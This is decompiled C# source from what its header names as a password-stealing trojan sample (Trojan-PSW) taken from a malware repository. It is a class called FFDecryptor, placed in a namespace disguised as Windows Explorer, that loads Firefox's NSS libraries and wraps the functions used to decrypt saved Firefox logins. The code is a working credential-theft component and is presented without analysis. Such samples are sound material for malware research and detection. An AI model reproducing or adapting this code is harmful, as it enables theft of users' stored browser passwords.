// Decompiled with JetBrains decompiler
// Type: Windows_Explorer.FFDecryptor
// Assembly: wqeqerwt4354wsey56sey5ts765y54, Version=7.52.5.2, Culture=neutral, PublicKeyToken=null
// MVID: 3FC4189E-BF6F-40C3-B48B-A4DA54DCDC94
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-PSW.Win32.VB.chm-8bf17b67595d474959c887391b17692103cd2a30a4e2cd4f51f483ad8140b647.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Windows_Explorer
{
  [StandardModule]
  internal sealed class FFDecryptor
  {
    private static IntPtr NSS3;
    public static string signon;

    [DllImport("kernel32.dll")]
    private static extern IntPtr LoadLibrary(string dllFilePath);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    public static long NSS_Init(string configdir)
    {
      string str = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
      FFDecryptor.LoadLibrary(str + "mozcrt19.dll");
      FFDecryptor.LoadLibrary(str + "nspr4.dll");
      FFDecryptor.LoadLibrary(str + "plc4.dll");
      FFDecryptor.LoadLibrary(str + "plds4.dll");
      FFDecryptor.LoadLibrary(str + "ssutil3.dll");
      FFDecryptor.LoadLibrary(str + "sqlite3.dll");
      FFDecryptor.LoadLibrary(str + "nssutil3.dll");
      FFDecryptor.LoadLibrary(str + "softokn3.dll");
      FFDecryptor.NSS3 = FFDecryptor.LoadLibrary(str + "nss3.dll");
      return ((FFDecryptor.DLLFunctionDelegate) Marshal.GetDelegateForFunctionPointer(FFDecryptor.GetProcAddress(FFDecryptor.NSS3, nameof (NSS_Init)), typeof (FFDecryptor.DLLFunctionDelegate)))(configdir);
    }

    public static long PK11_GetInternalKeySlot() => ((FFDecryptor.DLLFunctionDelegate2) Marshal.GetDelegateForFunctionPointer(FFDecryptor.GetProcAddress(FFDecryptor.NSS3, nameof (PK11_GetInternalKeySlot)), typeof (FFDecryptor.DLLFunctionDelegate2)))();

    public static long PK11_Authenticate(long slot, bool loadCerts, long wincx) => ((FFDecryptor.DLLFunctionDelegate3) Marshal.GetDelegateForFunctionPointer(FFDecryptor.GetProcAddress(FFDecryptor.NSS3, nameof (PK11_Authenticate)), typeof (FFDecryptor.DLLFunctionDelegate3)))(slot, loadCerts, wincx);

    public static int NSSBase64_DecodeBuffer(
      IntPtr arenaOpt,
      IntPtr outItemOpt,
      StringBuilder inStr,
      int inLen)
    {
      return ((FFDecryptor.DLLFunctionDelegate4) Marshal.GetDelegateForFunctionPointer(FFDecryptor.GetProcAddress(FFDecryptor.NSS3, nameof (NSSBase64_DecodeBuffer)), typeof (FFDecryptor.DLLFunctionDelegate4)))(arenaOpt, outItemOpt, inStr, inLen);
    }

    public static int PK11SDR_Decrypt(
      ref FFDecryptor.TSECItem data,
      ref FFDecryptor.TSECItem result,
      int cx)
    {
      return ((FFDecryptor.DLLFunctionDelegate5) Marshal.GetDelegateForFunctionPointer(FFDecryptor.GetProcAddress(FFDecryptor.NSS3, nameof (PK11SDR_Decrypt)), typeof (FFDecryptor.DLLFunctionDelegate5)))(ref data, ref result, cx);
    }

    public class SHITEMID
    {
      public static long cb;
      public static byte[] abID;

      [DebuggerNonUserCode]
      public SHITEMID()
      {
      }
    }

    public struct TSECItem
    {
      public int SECItemType;
      public int SECItemData;
      public int SECItemLen;
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate(string configdir);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate2();

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate4(
      IntPtr arenaOpt,
      IntPtr outItemOpt,
      StringBuilder inStr,
      int inLen);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate5(
      ref FFDecryptor.TSECItem data,
      ref FFDecryptor.TSECItem result,
      int cx);
  }
}
